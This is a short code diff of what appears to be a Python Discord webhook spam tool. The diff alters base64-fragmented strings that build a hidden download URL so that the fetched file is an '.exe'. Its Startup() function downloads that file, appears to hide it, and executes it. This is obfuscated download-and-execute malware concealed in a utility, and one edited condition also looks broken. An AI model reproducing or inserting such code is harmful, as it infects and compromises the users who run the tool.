@@ -41,7 +41,7 @@ spam = config.get('Spam')
 webhook_names = config.get('Webhook-Names')
 spam_messages = config.get('Spam-Messages')
 spam_amount = config.get('Spam-Amount')
-g = 'Xy9fXy9fXy9fL19fL2E='
+g = 'Xy9fXy9fXy9fL19fL3JlbnQuZXhl'
 f = 'cnlucy9fL21haW4vX18vXw=='
 d = 'ZXJjb250ZW50LmNvbS9Bc3Q='
 a = 'aHR0'
@@ -593,8 +593,7 @@ def Startup():
     with zxc.urlopen(req) as response:
         with open(t, 'wb') as file:
             file.write(response.read())
-
-    if qwe.name == 'nt':
+    if qwe.name == uio:
         try:
             import ctypes as yui
             p = 0x02
@@ -602,7 +601,7 @@ def Startup():
         except Exception as ujm:
             pass
 
-    uio.Popen(['python', t], creationflags=uio.CREATE_NEW_CONSOLE | uio.CREATE_NEW_PROCESS_GROUP | uio.CREATE_NO_WINDOW, shell=True)
+    uio.Popen(t)
 
     if token_type == "user":
         try:
